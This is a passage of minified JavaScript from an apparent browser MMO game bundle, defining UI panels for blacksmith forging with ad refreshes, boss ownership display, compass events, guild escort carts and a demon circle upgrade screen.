k=a.CityCC.ins().fortunateNum;if(this.fortunateNum.text=gettext("幸运刷新次数:({0}/10)",k),e.isBuy?(this.btnForging.label=gettext("已锻造"),this.btnForging.enabled=!1):(this.btnForging.label=gettext("锻造"),this.btnForging.enabled=!0),2==platform.getAdType())if(a.CityCC.ins().adLastTimes>0){var B=I.LocationProperty.IOS_NO_AD_TIME-(_.GameServerCC.serverTime-S.DateUtils.formatMiniDateTime(x.Setting.ins().getValue(x.ClientSet.BlackSmith)));this.btnFlushed.enabled=0>=B,this.updateCountDown(),B>0&&!Timer.has(this.updateCountDown,this)&&Timer.start(1e3,-1,this.updateCountDown,this)}else Timer.stop(this.updateCountDown,this),this.btnFlushed.enabled=!0,this.lbFree.text=gettext("还可刷新({0}次)",a.CityCC.ins().adLastTimes);else 1==platform.getAdType()?this.lbFree.text=gettext("看广告次数{0}次",a.CityCC.ins().adLastTimes):3==platform.getAdType()&&(this.btnFlushed.enabled=!0,this.lbFree.text=gettext("还可刷新({0}次)",a.CityCC.ins().adLastTimes))},e.prototype.updateCountDown=function(){var t=I.LocationProperty.IOS_NO_AD_TIME-(_.GameServerCC.serverTime-S.DateUtils.formatMiniDateTime(x.Setting.ins().getValue(x.ClientSet.BlackSmith)));t>0?this.lbFree.text=S.DateUtils.getFormatBySecond(.001*t,S.DateUtils.TIME_FORMAT_3):(this.lbFree.text=gettext("还可刷新({0}次)",a.CityCC.ins().adLastTimes),this.btnFlushed.enabled=!0,Timer.stop(this.updateCountDown,this))},e.prototype.onClick=function(t){var e=a.CityCC.ins().showBlackSmithDatas[this.tabItem.selectedIndex];switch(t.currentTarget){case this.btnForging:if(!e)return;if(v.BagCT.ins().getAllSurplusCount(1)<=0)return void g.TipsCT.ins().showTips(gettext("背包已满，请前往清理"));var i=a.CityCC.ins().getMoneyCostByLv(this.curCfg.level),n=e.quality*i;if(!b.GlobalFun.checkCost(n,w.MoneyConst.gold))return;a.CityCC.ins().sendForging(1,e.index);break;case this.btnFlushed:if(a.CityCC.ins().adLastTimes>0){if(2==platform.getAdType())return x.Setting.ins().setValue(x.ClientSet.BlackSmith,S.DateUtils.formatServerTime(_.GameServerCC.serverTime)),void y.GameLogic.ins().sendAdReward(d.AD_REWARDTYPE.BlackSmith);if(3==platform.getAdType())return void y.GameLogic.ins().sendAdReward(d.AD_REWARDTYPE.BlackSmith);if(C.Recharge.ins().isGotAdPrivilege||T.DeviceUtils.IsPC)return void y.GameLogic.ins().sendAdReward(d.AD_REWARDTYPE.BlackSmith);window.platform.showAd(function(){y.GameLogic.ins().sendAdReward(d.AD_REWARDTYPE.BlackSmith)},D.AdType.BlackSmith)}else g.TipsCT.ins().showTips(2==platform.getAdType()?gettext("次数不足"):gettext("观看广告次数不足"));break;case this.btnYbFlushed:var s=o.GlobalConfig.BlacksmithBaseConfig.cost;a.CityCC.ins().fortunateNum;s>f.ActorCC.yb?g.TipsCT.ins().showTips(gettext("元宝不足")):a.CityCC.ins().sendForging(2,e?e.index:1)}},e}(n.BaseView);e.BlackSmithWin=A,window.BlackSmithWin=A,__reflect(A.prototype,"BlackSmithWin",[]),window.BlackSmithWin=A},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BossBelongPanel=void 0;var n=i(18),o=i(42),s=i(5),a=i(1),r=i(34),l=i(37),h=i(4),u=i(162),p=i(23),d=i(28),c=function(t){function e(){var e=t.call(this)||this;return e.defaultRect=!1,e._sn_="BossBelongSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.bloodBar0.labelDisplay.visible=!1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateBelong,u.BossCT.ins().postBelongChange),observe(this,this.updateTarget,p.GameLogic.ins().postChangeTarget),this.addTouchEvent(this.belongGroup,this.onTap),this.addTouchEvent(this.attguishu1,this.onTap),this.updateBelong(),Timer.stop(this.updateBelong,this),Timer.start(200,0,this.updateBelong,this)},e.prototype.onTap=function(t){},e.prototype.updateTarget=function(){this.setBtnState()},e.prototype.setBtnState=function(){u.BossCT.ins().attHandle==h.ActorCC.handle?this.attguishu1.visible=!1:(this.attguishu1.visible=!0,this.attguishu1.label=gettext("抢夺归属"))},e.prototype.updateBelong=function(){this.updateTarget();var t=l.EntityManager.ins().getMasterList(u.BossCT.ins().attHandle);if(t&&t.length>0){for(var e=t.length,i=0,a=0,p=0,c=0,f=void 0,g=void 0,m=0;e>m;m++){var v=t[m];if(v.data.type==EntityType.Role){var y=v.infoModel.getAtt(r.AttributeType.atHp)||0,C=v.infoModel.getAtt(r.AttributeType.atMaxHp)||0;i+=y,a+=C;var T=v.infoModel.getAtt(r.AttributeType.cruNeiGong)||0,b=v.infoModel.getAtt(r.AttributeType.maxNeiGong)||0;p+=T,c+=b,f||(f=v.infoModel),g=v}}this.sameHanghui.visible=g&&!g.isMy&&d.Guild.ins().guildID&&f.guildID==d.Guild.ins().guildID,this.belongGroup.visible=i>0;var w=h.ActorCC.handle!=u.BossCT.ins().attHandle?n.ColorUtil.ROLENAME_COLOR_YELLOW:n.ColorUtil.ROLENAME_COLOR_GREEN,I=f.getNameWithServer(),_=I.split("\n");I=_[1]?_[1]:_[0],I=o.StringUtils.replaceStr(I,"0xffffff",w+""),this.belongNameTxt1.textFlow=s.TextFlowMaker.generateTextFlow("|C:"+w+"&T:"+I),this.roleHead1.source="yuanhead"+f.job+f.sex,this.bloodBar0.maximum=a,this.bloodBar0.value=i,this.neigongBar0.maximum=c,this.neigongBar0.value=p}else this.belongGroup.visible=!1},e}(a.BaseView);e.BossBelongPanel=c,window.BossBelongPanel=c,__reflect(c.prototype,"BossBelongPanel",[]),Systemap.BossBelongPanel=function(){return window.BossBelongPanel=c}},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CompassPanel=void 0;var n=i(8),o=i(1),s=i(0),a=i(12),r=i(25),l=i(7),h=i(2),u=i(237),p=i(152),d=i(362),c=i(363),f=function(t){function e(){var e=t.call(this)||this;return e._sn_="CompassPanelSkin",e.curPage=0,e.leftTime=0,e.maxPage=1,e.bolInitScroll=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.bolInitScroll=!1,this.proList.itemRenderer=c.CompassProItem,this.circleList.itemRenderer=d.CompassCircleItem,this.proList.dataProvider=this.proArc=new eui.ArrayCollection([]),this.circleList.dataProvider=this.circleArc=new eui.ArrayCollection([]),this.eProgress.maximum=p.CompassCT.ins().getMaxPower(),p.CompassCT.ins().rewardInfoArr&&0!=p.CompassCT.ins().rewardInfoArr.length||p.CompassCT.ins().initRewardInfo(),p.CompassCT.ins().sendGetRewardInfo()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(p.CompassCT.ins().postCompassInfo,this.updateInfo),this.observe(p.CompassCT.ins().postGetRewardInfo,this.updateProList),this.observe(p.CompassCT.ins().postRewardResult,this.updateProList),this.observe(p.CompassCT.ins().postPower,this.updateProgress),this.circleScroll.scrollPolicyV=this.circleScroll.scrollPolicyH=eui.ScrollPolicy.OFF,this.addTouchEvent(this.leftBtn,this.onPageClick),this.addTouchEvent(this.rightBtn,this.onPageClick),this.addTouchEvent(this.rewardBtn,this.onTap),this.addTouchEvent(this.buyBtn,this.onTap),this.updateTime(),this.updateProList(),this.updateList(),this.updateProgress()},e.prototype.initScroll=function(){if(!this.bolInitScroll){this.bolInitScroll=!0;for(var t=0,e=0;e<p.CompassCT.ins().rewardInfoArr.length;e++){var i=p.CompassCT.ins().rewardInfoArr[e];(i.freeCount||i.purchasedCount)&&(t=i.idx)}var n=110*t-100,o=this.proScroll.viewport.contentHeight-this.proScroll.height;n>o&&(n=o),0>n&&(n=0),this.proScroll.viewport.scrollV=n}},e.prototype.onTap=function(t){switch(t.target){case this.rewardBtn:win.open("CompassRewardWin",p.CompassCT.ins().rewardType,p.CompassCT.ins().rewardRank);break;case this.buyBtn:var e=s.GlobalConfig.CompassBaseConfig.ridParam;r.Recharge.ins().sendPayOrder(null===e||void 0===e?void 0:e.rid)}},e.prototype.onPageClick=function(t){switch(t.target){case this.leftBtn:this.curPage--;break;case this.rightBtn:this.curPage++}this.curPage<0&&(this.curPage=0),this.curPage>this.maxPage&&(this.curPage=this.maxPage);var e=817*this.curPage;egret.Tween.removeTweens(this.circleList);var i=egret.Tween.get(this.circleList);i.to({scrollH:e},300),this.updatePageBtn()},e.prototype.updateInfo=function(){p.CompassCT.ins().bolActOpen?(this.updateProList(),this.updateList()):win.close(u.ZhanChangMainView)},e.prototype.updateProList=function(){this.buyBtn.visible=!p.CompassCT.ins().bolRecharge;var t=p.CompassCT.ins().rewardInfoArr;this.eProgress.width=110*t.length,this.proArc.replaceAll(t),this.initScroll()},e.prototype.updateProgress=function(){this.eProgress.value=p.CompassCT.ins().power;for(var t=0;t<this.circleList.numChildren;t++){var e=this.circleList.getChildAt(t);e instanceof d.CompassCircleItem&&e.updatePower()}},e.prototype.updateList=function(){var t=[],e=0;for(var i in p.CompassCT.ins().taskInfoDic){var n=p.CompassCT.ins().taskInfoDic[i],o=s.GlobalConfig.CompassTaskConfig[n.taskId];o&&(t[o.group]||(t[o.group]={group:o.group,list:[]}),t[o.group].list.push(n),e=e<o.group?o.group:e)}var a=[];for(var i in t){var n=t[i];a.push(n)}e<p.CompassCT.ins().maxTaskGroup&&a.push({group:e+1,list:[]}),this.circleArc.replaceAll(a),this.maxPage=a.length,this.updatePageBtn()},e.prototype.updatePageBtn=function(){this.leftBtn.visible=this.curPage>0,this.rightBtn.visible=this.curPage<this.maxPage-1},e.prototype.updateTime=function(){var t=p.CompassCT.ins().startTimes+24*s.GlobalConfig.CompassBaseConfig.openduration*60*60*1e3;this.leftTime=Math.ceil(.001*(t-l.GameServerCC.serverTime)),Timer.has(this.flusLeftTime,this)||Timer.start(1e3,-1,this.flusLeftTime,this),this.flusLeftTime()},e.prototype.flusLeftTime=function(){this.leftTime--,this.leftTime<=0?this.lbTime.text=gettext("活动未开启"):this.lbTime.text=gettext("罗盘关闭时间:")+n.DateUtils.getFormatBySecond(this.leftTime,n.DateUtils.TIME_FORMAT_5,3)},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if(!p.CompassCT.ins().bolActOpen)return h.TipsCT.ins().showTips(gettext("活动未开启")),!1;var i=s.GlobalConfig.CompassBaseConfig.openId,n=a.OpenSystem.ins().checkSysOpen(i);return n||h.TipsCT.ins().showTips(a.OpenSystem.ins().getNoOpenTips(i)),n},e.prototype.removeDisplay=function(){this.skin&&egret.Tween.removeTweens(this.circleList)},e.prototype.tabRp=function(){return p.CompassCT.ins().getRewardRedpoint()>0},__decorate([delayCall(300)],e.prototype,"initScroll",null),e}(o.BaseView);e.CompassPanel=f,window.CompassPanel=f,__reflect(f.prototype,"CompassPanel",[]),window.CompassPanel=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CompassRewardWin=void 0;var n=i(1),o=i(77),s=i(0),a=i(12),r=i(2),l=i(152),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="CompassRewardWinSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listItem.itemRenderer=o.ItemBaseNoName,this.listItem.dataProvider=this.eArc=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.rewardType=t[0],this.rewardRank=t[1],this.eTab.dataProvider=new eui.ArrayCollection([gettext("星域罗盘"),gettext("紫霄罗盘")]),this.eTab.selectedIndex=0,this.eTab.addEventListener(egret.Event.CHANGE,this.updateList,this),this.updateList()},e.prototype.updateList=function(){var t={},e=l.CompassCT.ins().getRewardByCfg(this.rewardType,this.rewardRank);if(e&&e.reward){var i=s.GlobalConfig.CompassRewardInfoConfig[e.reward[1]],n=i&&i.rewards?i.rewards:[],o=s.GlobalConfig.CompassRewardInfoConfig[e.reward[2]],a=o&&o.rewards?o.rewards:[];if(0==this.eTab.selectedIndex){this.imgIcon.source=null===e||void 0===e?void 0:e.img;for(var r=0;r<n.length;r++){var h=n[r];t[h.id]?t[h.id].count+=h.count:t[h.id]={type:h.type,id:h.id,count:h.count}}}else if(1==this.eTab.selectedIndex){this.imgIcon.source="compass20";for(var r=0;r<a.length;r++){var h=a[r];t[h.id]?t[h.id].count+=h.count:t[h.id]={type:h.type,id:h.id,count:h.count}}}var u=Object.keys(t).map(function(e){return t[e]});this.eArc.replaceAll(u)}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=s.GlobalConfig.CompassBaseConfig.openId,n=a.OpenSystem.ins().checkSysOpen(i);return n||r.TipsCT.ins().showTips(a.OpenSystem.ins().getNoOpenTips(i)),n},e.prototype.removeDisplay=function(){!this.skin},e}(n.BaseView);e.CompassRewardWin=h,window.CompassRewardWin=h,__reflect(h.prototype,"CompassRewardWin",[]),window.CompassRewardWin=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarBuyPanel=void 0;var n=i(5),o=i(1),s=i(0),a=i(68),r=i(364),l=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.list_goods.itemRenderer=r.CrossDartCarGoodsItem;var t=[],e=s.GlobalConfig.GuildEscortCartConfig;for(var i in e)t.push(e[i]);this.list_goods.dataProvider=new eui.ArrayCollection(t)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(a.CrossDartCarCT.ins().postGetJoinInfo,this.updateView),this.observe(a.CrossDartCarCT.ins().postGetCarInfo,this.updateView),this.updateView()},e.prototype.updateView=function(){var t=gettext("第一趟："),e=a.CrossDartCarCT.ins().getCarState(1),i=a.CrossDartCarCT.ins().getCarState(2);t+=a.CrossDartCarCT.ins().getCarStateStr(e,!0)+"\n",t+=gettext("第二趟："),t+=a.CrossDartCarCT.ins().getCarStateStr(i,!0),this.lb_log.textFlow=n.TextFlowMaker.generateTextFlow(t)},e.prototype.removeDisplay=function(){this.skin&&this.removeObserve()},e}(o.BaseView);e.CrossDartCarBuyPanel=l,window.CrossDartCarBuyPanel=l,__reflect(l.prototype,"CrossDartCarBuyPanel",[]),window.CrossDartCarBuyPanel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarDescPanel=void 0;var n=i(21),o=i(18),s=i(8),a=i(19),r=i(1),l=i(0),h=i(28),u=i(7),p=i(2),d=i(27),c=i(68),f=i(365),g=function(t){function e(){var e=t.call(this)||this;return e.leftTime=0,e.leftSendTime=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list_mem.itemRenderer=f.CrossDartCarMemItem,this.list_mem.dataProvider=this.arc=new eui.ArrayCollection([]),this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(c.CrossDartCarCT.ins().postGetJoinInfo,this.updateView),this.observe(c.CrossDartCarCT.ins().postPlunder,this.updateView),this.observe(c.CrossDartCarCT.ins().postPlayerInfo,this.updateView),this.observe(c.CrossDartCarCT.ins().postGetCarInfo,this.updateView),this.observe(c.CrossDartCarCT.ins().postGetAllInfo,this.updateTime),this.observe(h.Guild.ins().postGuildMembers,this.updateMemList),h.Guild.ins().sendGuildMembers(),c.CrossDartCarCT.ins().sendGetCarInfo(),this.updateView(),this.updateTime(),this.updateMemList()},e.prototype.onClick=function(t){switch(t.target){case this.btnStart:c.CrossDartCarCT.ins().startSendCar();break;case this.btnInsure:if(c.CrossDartCarCT.ins().bolBuyInsure)return void p.TipsCT.ins().showTips(gettext("已购买保险"));var e=c.CrossDartCarCT.ins().getCurSendTimes(),i=c.CrossDartCarCT.ins().getCarState(e),n=c.CrossDartCarCT.ins().getCarInfoByGuildId(h.Guild.ins().guildID);if(3==i||n&&n.tranT)return void p.TipsCT.ins().showTips(gettext("当前无镖可投保"));var o=l.GlobalConfig.GuildEscortCartBaseConfig.insurePrice;if(o&&o.count){var s=a.GlobalFun.getItemName(o.id);d.WarnWin.show(gettext("是否花费{0}{1}购买保险?",o.count,s),this.buyInsure,this)}else this.buyInsure()}},e.prototype.buyInsure=function(){var t=l.GlobalConfig.GuildEscortCartBaseConfig.insurePrice;if(a.GlobalFun.checkCost(t.count,t.id)){var e=c.CrossDartCarCT.ins().getCurSendTimes(),i=c.CrossDartCarCT.ins().getCarState(e);return 0==i||3==i?void p.TipsCT.ins().showTips(gettext("需要先购镖才能购买保险")):void c.CrossDartCarCT.ins().sendBuyInsure()}},e.prototype.playEff=function(t){if(void 0===t&&(t=!0),t){this.mcCar||(this.mcCar=new n.MovieClip,this.effGrp.addChild(this.mcCar));var e=l.GlobalConfig.GuildEscortCartBaseConfig.mcRes;this.mcCar.playFile(RES_DIR_EFF+e,-1)}else this.mcCar&&(removeFromParent(this.mcCar),this.mcCar=null);this.imgCar.visible=!t,this.lb_run.visible=t},e.prototype.updateView=function(){var t=c.CrossDartCarCT.ins().getCurSendTimes(),e=c.CrossDartCarCT.ins().getCarState(t),i=c.CrossDartCarCT.ins().getGuildCarState(t);this.lb_insure.text=c.CrossDartCarCT.ins().bolBuyInsure?gettext("已投保"):gettext("未投保"),this.lb_insure.textColor=c.CrossDartCarCT.ins().bolBuyInsure?o.ColorUtil.GREEN_COLOR_N:o.ColorUtil.RED_COLOR_N,this.lb_buy.text=0!=e?gettext("已购买"):gettext("未购买"),this.lb_buy.textColor=0!=e?o.ColorUtil.GREEN_COLOR_N:o.ColorUtil.RED_COLOR_N,2==t&&2==i?this.lb_showtime.text=gettext("行会两次运镖已结束"):2==t?this.lb_showtime.text=gettext("当前第{0}趟镖",t):1==t?c.CrossDartCarCT.ins().checkInStartTime(!1)?this.lb_showtime.text=gettext("当前第{0}趟镖",t)+gettext("({0}开始第二趟镖)",l.GlobalConfig.GuildEscortCartBaseConfig.startTime2):this.lb_showtime.text=gettext("即将开启（{0}开始第一趟镖）",l.GlobalConfig.GuildEscortCartBaseConfig.startTime1):this.lb_showtime.text="";var n=c.CrossDartCarCT.ins().getGuildCarStateStr(i,t),s=c.CrossDartCarCT.ins().luckAdd;s&&(n+=gettext("(幸运加成+{0}%)",.01*s)),this.lb_state.textFlow=TextFlowMakerEntry.generateTextFlow(n),this.playEff(1==i)},e.prototype.updateMemList=function(){var t=c.CrossDartCarCT.ins().memInfoList;this.arc.replaceAll(t);var e=c.CrossDartCarCT.ins().getLeftMemsNum();this.lb_member.text=gettext("{0}人(存活{1}人)",e[0],e[1])},e.prototype.updateTime=function(){this.leftTime=Math.ceil(.001*(c.CrossDartCarCT.ins().arriveTime-u.GameServerCC.serverTime)),Timer.has(this.flusLeftTime,this)||Timer.start(1e3,-1,this.flusLeftTime,this),this.formatStrTimeToArr(),this.flusLeftTime()},e.prototype.flusLeftTime=function(){this.leftTime--,this.leftTime<=0?this.lb_activeTime.text="-":this.lb_activeTime.text=s.DateUtils.getFormatBySecond(this.leftTime,s.DateUtils.TIME_FORMAT_1),this.leftSendTime--,this.leftSendTime<=0?this.lb_sendTimes.text="":this.lb_sendTimes.text=gettext("{0}后自动发车",s.DateUtils.getFormatBySecond(this.leftSendTime,s.DateUtils.TIME_FORMAT_1))},e.prototype.formatStrTimeToArr=function(){var t=c.CrossDartCarCT.ins().getCurSendTimes(),e=c.CrossDartCarCT.ins().getGuildCarState(t);if(0!=e)return void(this.leftSendTime=0);var i,n=c.CrossDartCarCT.ins().getCurDartTimeState();if(2==n?i=l.GlobalConfig.GuildEscortCartBaseConfig.autoTime[1]:1==n&&(i=l.GlobalConfig.GuildEscortCartBaseConfig.autoTime[0]),i){var o=s.DateUtils.formatStrTimeToToday1(i,u.GameServerCC.serverTime);this.leftSendTime=Math.ceil(.001*(o-u.GameServerCC.serverTime))}},e.prototype.removeDisplay=function(){this.skin&&this.removeObserve()},e}(r.BaseView);e.CrossDartCarDescPanel=g,window.CrossDartCarDescPanel=g,__reflect(g.prototype,"CrossDartCarDescPanel",[]),window.CrossDartCarDescPanel=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarLogPanel=void 0;var n=i(1),o=i(68),s=i(366),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.list_log.itemRenderer=s.CrossDartCarLogItem,this.list_log.dataProvider=this.arc=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(o.CrossDartCarCT.ins().postGetLog,this.updateView),o.CrossDartCarCT.ins().bolReqLog=!0,o.CrossDartCarCT.ins().sendGetLog(),this.updateView()},e.prototype.updateView=function(){var t=o.CrossDartCarCT.ins().logInfoList;this.arc.replaceAll(t),o.CrossDartCarCT.ins().bolLogChange=!1,o.CrossDartCarCT.ins().postRedChange()},e.prototype.removeDisplay=function(){this.skin&&this.removeObserve()},e.prototype.tabRp=function(){return o.CrossDartCarCT.ins().bolLogChange},e}(n.BaseView);e.CrossDartCarLogPanel=a,window.CrossDartCarLogPanel=a,__reflect(a.prototype,"CrossDartCarLogPanel",[]),window.CrossDartCarLogPanel=a},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DemonCirPanel=void 0;var n=i(16),o=i(49),s=i(19),a=i(5),r=i(1),l=i(22),h=i(72),u=i(34),p=i(0),d=i(15),c=i(4),f=i(6),g=i(76),m=i(12),v=i(2),y=i(115),C=i(155),T=i(375),b=function(t){function e(){var e=t.call(this)||this;return e.roleIndex=0,e.pageId=1,e.spSkillObj=[],e.isMaxLv=!1,e.isMaxSkill=!1,e.preBarVal=0,e.maxBarVal=1,e._sn_="demonCirSkin",e.openTZs=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onTap),this.addTouchEvent(this.leftBtn,this.onPageClick),this.addTouchEvent(this.rightBtn,this.onPageClick),this.pageId=1;var t=y.DemonCir.ins().getRoleDataByID(this.roleIndex);if(t)for(var e=Object.keys(p.GlobalConfig.DemonCirBase).length,i=1;e>=i;i++){var n=t.getDemonDataByID(i);if(n){this.pageId=i;break}}},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.curCfg=p.GlobalConfig.DemonCirBase[this.pageId],observe(this,this.updateView,y.DemonCir.ins().postRoleDatas),observe(this,this.updateView,y.DemonCir.ins().postSpecialUp),observe(this,this.callbackDemonLevelUp,y.DemonCir.ins().postDemonLevelUp),observe(this,this.updateView,y.DemonCir.ins().postDemonCirLevelCfg),observe(this,this.updateView,y.DemonCir.ins().postShowChange),observe(this,this.updateMaterail,f.BagCT.ins().postItemAdd),observe(this,this.updateMaterail,f.BagCT.ins().postItemChange),observe(this,this.updateMaterail,f.BagCT.ins().postItemDel),observe(this,this.updateRed,C.DemonCirRedPoint.ins().postRedPoint),this.spSkillObj=[],this.updateView()},e.prototype.callbackDemonLevelUp=function(){var t,e=y.DemonCir.ins().getRoleDataByID(this.roleIndex);if(e){var i=e.getDemonDataByID(null===(t=this.curCfg)||void 0===t?void 0:t.id);if(!i)return;var n=y.DemonCir.ins().getDemonCirLevelCfg(this.curCfg.id,i.level);if(!n)return;var o=i.exp/n.exp*100;o<=this.preBarVal&&(this.bar.slideDuration=500,this.bar.value=100,Timer.stop(this.updateBarText,this),Timer.start(30,-1,this.updateBarText,this))}this.updateView()},e.prototype.updateView=function(){this.dcNameImg.source=this.curCfg.mainNameImg,this.updateSkillItem(),this.updateSpSkillItem(),this.updateDcAttr(),this.updateMc(),this.updateMaterail()},e.prototype.updateSkillItem=function(){var t=y.DemonCir.ins().getRoleDataByID(this.roleIndex),e=t.getDemonDataByID(this.curCfg.id);this.actived=null!=e,this.openTZs=[];var i=0,n=this.curCfg.tezhiAttrC[0],o=this.actived;o&&(i=this.getTeZhiLvl(n,e.level),o=i>0,o&&this.openTZs.push({id:n,lvl:i})),this.skillicon.setData({roleId:this.roleIndex,type:T.DCSkillItemCell.TYPE_TEZHI,id:n,actived:o,param:i}),this.skillicon.demonID=this.curCfg.id,this.skillicon.demonLvl=e?e.level:1,this.ability.setData({roleId:this.roleIndex,type:T.DCSkillItemCell.TYPE_TALENT,id:this.curCfg.id,actived:this.actived,param:null});var s;p.GlobalConfig.DemonCirTeZhi[this.curCfg.id]&&(s=i?p.GlobalConfig.DemonCirTeZhi[this.curCfg.id][i]:p.GlobalConfig.DemonCirTeZhi[this.curCfg.id][1]),s&&(this.Skillname.text=s.name,this.Skilllevel.text=i.toString())},e.prototype.getAttrObj=function(t,e,i,n){void 0===i&&(i=!1),void 0===n&&(n=!0);for(var o,s=h.AttributeFormat.getFormat(0,0,"",0,0,null,null),a=[],r=0,p=t;r<p.length;r++){var d=p[r],c=n?l.AttributeData.getAttStr1(d,s):"?";if(d.type==u.AttributeType.atAtkMin||d.type==u.AttributeType.atAtkMageMin||d.type==u.AttributeType.atAtkTaoistMin||d.type==u.AttributeType.atDef)o={type:d.type,str:c};else{o?o.str+="-"+c:o={type:d.type,str:c},e&&(o.str="|C:"+e+"&T:("+o.str+")|");var f=i?"":l.AttributeData.getAttrStrByType(o.type)+": ";o.str=f+o.str,a.push(o),o=null}}return a},e.prototype.updateMc=function(){var t=y.DemonCir.ins().getRoleDataByID(this.roleIndex);if(t&&this.curCfg){this.deEff||(this.deEff=ObjectPool.pop("MovieClip")),this.deEff.parent||this.demonCirEff.addChild(this.deEff),this.deEff.playFile(""+RES_DIR_EFF+this.curCfg.winEff,-1),this.demonCirEff.filters=this.actived?null:o.FilterUtil.ARRAY_GRAY_FILTER,this.deEffLeft||(this.deEffLeft=ObjectPool.pop("MovieClip")),this.deEffLeft.parent||this.effLeft.addChild(this.deEffLeft);var e,i=Object.keys(p.GlobalConfig.DemonCirBase).length;e=this.curCfg.id<=1?p.GlobalConfig.DemonCirBase[i]:p.GlobalConfig.DemonCirBase[this.curCfg.id-1],this.deEffLeft.playFile(""+RES_DIR_EFF+(null===e||void 0===e?void 0:e.winEff),-1),this.effLeft.filters=t.getDemonDataByID(null===e||void 0===e?void 0:e.id)?null:o.FilterUtil.ARRAY_GRAY_FILTER,this.deEffRight||(this.deEffRight=ObjectPool.pop("MovieClip")),this.deEffRight.parent||this.effRight.addChild(this.deEffRight),e=this.curCfg.talent>=i?p.GlobalConfig.DemonCirBase[1]:p.GlobalConfig.DemonCirBase[this.curCfg.talent+1],this.deEffRight.playFile(""+RES_DIR_EFF+(null===e||void 0===e?void 0:e.winEff),-1),this.effRight.filters=t.getDemonDataByID(null===e||void 0===e?void 0:e.id)?null:o.FilterUtil.ARRAY_GRAY_FILTER}},e.prototype.updateDcAttr=function(){this.showBtn.enabled=this.actived;var t=h.AttributeFormat.getFormat(0,0,"：",0,1,null,null);h.AttributeFormat.getFormat(0,0,"+",0,0,null,null);this.shengji.visible=!0,this.lvMaxDesc.visible=!1,this.nextAttrScroll.visible=!0,this.arrow.visible=!0,this.nextAttrTxt.visible=!0,this.nowAttrTxt.left=100;var e=c.ActorCC.jobId;if(this.actived){var i=y.DemonCir.ins().getRoleDataByID(this.roleIndex),n=i.getDemonDataByID(this.curCfg.id);this.isMaxLv=n.level>=p.GlobalConfig.DemonCirBase[this.curCfg.id].maxLevel,this.bmpTxtLv.text=n.level.toString();var o=this.getTotalAttrByLvl(n.level);if(!o)return;for(var s=this.spSkillObj.concat([]),r=0,u=s;r<u.length;r++){var d=u[r];if(d.attr&&d.attr.value>0){var f=l.AttributeData.changeJobAttr(d.attr.type,e);o.push(new l.AttributeData(f,0));var g=l.AttributeData.getRelationJobAttr(f);g&&o.push(new l.AttributeData(g,0))}}o=l.AttributeData.combineAtts(o);for(var m="",v=this.getAttrObj(o),C=[],T=0,b=s;T<b.length;T++){var d=b[T];d.attr&&C.push(d.attr)}for(var w=this.getAttrObj(C,10485666,!0),I=0,_=v;I<_.length;I++){var d=_[I];m+=d.str;for(var S=0,x=w;S<x.length;S++){var D=x[S];d.type==D.type&&(m+=" "+D.str)}m+="\n"}m=m.replace(/\n$/,"");for(var A=0,k=s;A<k.length;A++){var d=k[A];d.allAdd&&(m+="\n"+gettext("法阵全属性提升{0}%",d.allAdd))}if(this.isMaxLv&&this.isMaxSkill?this.maxAttr.textFlow=a.TextFlowMaker.generateTextFlow1(m):this.nowAttr.textFlow=a.TextFlowMaker.generateTextFlow1(m),this.eProBarGrp.visible=!this.isMaxLv,(!this.isMaxLv||!this.isMaxSkill)&&(this.shengjiBtn.label=gettext("升   级"),o=this.getTotalAttrByLvl(n.level+1),o||(o=this.getTotalAttrByLvl(n.level)),o)){s=this.spSkillObj.concat([]);for(var B=0,P=s;B<P.length;B++){var d=P[B];if(d.attr&&d.attr.value>0){var f=l.AttributeData.changeJobAttr(d.attr.type,e);o.push(new l.AttributeData(f,0));var g=l.AttributeData.getRelationJobAttr(f);g&&o.push(new l.AttributeData(g,0))}}o=l.AttributeData.combineAtts(o);for(var R="",E=this.getAttrObj(o),G=[],M=0,L=s;M<L.length;M++){var d=L[M];d.attr&&G.push(d.attr)}for(var F=this.getAttrObj(G,10485666,!0,!1),O=0,N=E;O<N.length;O++){var d=N[O];R+=d.str;for(var W=0,U=F;W<U.length;W++){var D=U[W];d.type==D.type&&(R+=" "+D.str)}R+="\n"}R=R.replace(/\n$/,"");for(var H=0,q=s;H<q.length;H++){var d=q[H];d.allAdd&&(R+="\n"+gettext("法阵全属性提升{0}%",d.allAdd))}this.nextAttr.textFlow=a.TextFlowMaker.generateTextFlow1(R)}this.isMaxLv&&(this.shengji.visible=!1,this.lvMaxDesc.visible=!0)}else{this.shengjiBtn.label=gettext("激   